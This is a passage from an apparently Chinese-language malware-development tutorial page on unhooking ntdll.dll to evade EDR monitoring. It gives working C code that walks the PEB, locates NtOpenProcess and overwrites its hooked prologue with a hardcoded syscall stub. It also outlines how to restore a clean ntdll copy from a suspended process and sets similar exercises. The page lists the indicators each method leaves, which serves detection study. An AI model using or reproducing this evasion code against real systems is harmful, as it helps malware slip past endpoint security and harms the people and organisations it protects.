</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateFileMappingA Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// mapping the view of file of ntdll.dll
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pNtdllBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">MapViewOfFile</span>(hSection, FILE_MAP_READ, NULL, NULL, NULL);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pNtdllBuffer <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] MapViewOfFile Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>好，我们来讨论一下该方法存在的 IOC：</p>
<ol>
<li>从磁盘中读取 ntdll.dll 对于良性程序来说比较可疑</li>
<li>在 unhook 之前，我们需要用到一些敏感的函数，例如 VirtualProtect，WriteProcessMemory(可用于代替 VirtualProtect 和 memcpy 组合) 等</li>
<li>EDR 可以验证载入的 ntdll 的完整性以判断是否遭到了纂改</li>
</ol>
<p><strong>拓展</strong></p>
<p>我们是从磁盘中读取 ntdll，其实我们还可以从 KnownDlls 目录、远程 web 服务器上读取。请查询资料以及所需的 API 的用法，进行实现作为练习。</p>
<h3 id="补丁-ntapi">
  <strong>补丁 NTAPI</strong>
  <a class="anchor" href="#%e8%a1%a5%e4%b8%81-ntapi">#</a>
</h3>
<p>相比替换整个 ntdll 模块的 .text 节，我们可以选择只补丁我们所需的且被 hook 的函数，这样，补丁的动作会相对小一些。相比之前的代码，我们可以硬编码或者动态地获得目标 NTAPI 的 syscall stub 指令字节，其实区别只在于 SSN。至于如何动态地获取 SSN，我们会在下一小节进行讲解，因此这里我们就硬编码 NtOpenProcess 的 syscall stub 好了。</p>
<p>需要略加注意的是，对于给定的函数，其地址很大概率不是与<strong>内存页</strong>对齐的，幸运的是，像 VirtualAlloc、VirtualProtect 这类函数会自动帮我们适用向下最近的页的地址。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155623.png" alt="20240324155623" /></p>
<p>对于代码，我们只需要增加硬编码的 NTAPI 的 syscall stub，以及对 CheckFuncByName 稍加修改。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetModule</span>(HMODULE<span style="color:#f92672">*</span> ntdll, HMODULE<span style="color:#f92672">*</span> kernel32)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PPEB peb <span style="color:#f92672">=</span> (PPEB)(<span style="color:#a6e22e">__readgsqword</span>(<span style="color:#ae81ff">0x60</span>));
</span></span><span style="display:flex;"><span> PPEB_LDR_DATA ldr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PPEB_LDR_DATA<span style="color:#f92672">*</span>)((PBYTE)peb <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">//PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PLIST_ENTRY ntdlllistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ldr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>ntdll <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernelbaselistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernel32listentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)kernelbaselistentry);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>kernel32 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)kernel32listentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CheckFuncByName</span>(IN HMODULE hModule, <span style="color:#66d9ef">const</span> CHAR<span style="color:#f92672">*</span> funcName, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> cleanNTAPI)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)hModule;
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> FunctionNameArray[i]);
</span></span><span style="display:flex;"><span>  PBYTE pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)(pBase <span style="color:#f92672">+</span> FunctionAddressArray[FunctionOrdinalArray[i]]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_stricmp</span>(funcName, pFunctionName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> (pFunctionAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s may not be hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s is hooked, its address is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName, pFunctionAddress);
</span></span><span style="display:flex;"><span>    DWORD_PTR pageStart <span style="color:#f92672">=</span> ((DWORD_PTR)pFunctionAddress <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Start address of the page is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pageStart);
</span></span><span style="display:flex;"><span>    DWORD oldProtection <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> isProtected <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualProtect</span>((PBYTE)pageStart, <span style="color:#ae81ff">0x1000</span>, PAGE_EXECUTE_READWRITE, <span style="color:#f92672">&amp;</span>oldProtection);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(pFunctionAddress, cleanNTAPI, <span style="color:#ae81ff">0xb</span>);
</span></span><span style="display:flex;"><span>    isProtected <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualProtect</span>((PBYTE)pageStart,<span style="color:#ae81ff">0x1000</span>, oldProtection, <span style="color:#f92672">&amp;</span>oldProtection);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> HMODULE ntdll;
</span></span><span style="display:flex;"><span> HMODULE kernel32;
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">GetModule</span>(<span style="color:#f92672">&amp;</span>ntdll, <span style="color:#f92672">&amp;</span>kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ntdll base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ntdll);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;kernel32 base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> cleanNtOpenProcess[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4c\x8b\xd1\xb8\x26\x00\x00\x00\x0f\x05\xc3</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>,cleanNtOpenProcess);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>,cleanNtOpenProcess);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>代码的 syscall stub 中保存的是最精简的指令，因为这足以成功发起 syscall。总之，通过补丁给定被 hook 的函数指令，可以实现对想要的函数进行 unhook。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155635.png" alt="20240324155635" /></p>
<p>对于此方法，虽然比替换整个代码区动静要小一些，但因为原理相似，论 IOC 其实是差不多的。</p>
<h3 id="从挂起的进程中载入纯净-ntdll-模块">
  <strong>从挂起的进程中载入纯净 ntdll 模块</strong>
  <a class="anchor" href="#%e4%bb%8e%e6%8c%82%e8%b5%b7%e7%9a%84%e8%bf%9b%e7%a8%8b%e4%b8%ad%e8%bd%bd%e5%85%a5%e7%ba%af%e5%87%80-ntdll-%e6%a8%a1%e5%9d%97">#</a>
</h3>
<p>我们还可以通过读取挂起进程中载入的 ntdll 来获得纯净的副本，并用于 unhook。当进程以<strong>挂起</strong>或者<strong>被调试</strong>的状态被创建，此时只有 ntdll 被载入，EDR 还未来得及注入其检视 API 调用的模块。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155709.png" alt="20240324155709" /></p>
<p>在这之后，我们可以通过 ReadProcessMemory 来读取载入的 ntdll 模块的代码区。要能精准地获取干净副本的代码区并实现 unhook，我们可以通过以下的步骤实现：</p>
<ol>
<li>使用 <strong>NtQueryInformationProcess</strong> API 获得远程挂起进程的 PEB 地址</li>
<li>通过 <strong>PEB Walking</strong> 的方法获得远程进程中载入的纯净 ntdll 地址。因为是远程进程，步骤会不那么直接一些。</li>
<li>因为都是已经载入到内存的 ntdll，解析当前载入的 ntdll 模块(即被 hook 的) 从而获取代码区的 <strong>RVA</strong> 以及<strong>尺寸</strong></li>
<li>从纯净的 ntdll 模块的代码区开始读取，直到读取字节数达到尺寸</li>
<li>覆盖被 hook 的代码区实现 unhook</li>
</ol>
<p><em><strong>知道了原理与流程后，作为一道练习题，请学员们尝试自行完成完整代码，并分析该方法有哪些 IOC。</strong></em></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#检测内联-hook"><strong>检测内联 Hook</strong></a></li>
        <li><a href="#替换-text-节"><strong>替换 .text 节</strong></a></li>
        <li><a href="#补丁-ntapi"><strong>补丁 NTAPI</strong></a></li>
        <li><a href="#从挂起的进程中载入纯净-ntdll-模块"><strong>从挂起的进程中载入纯净 ntdll 模块</strong></a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












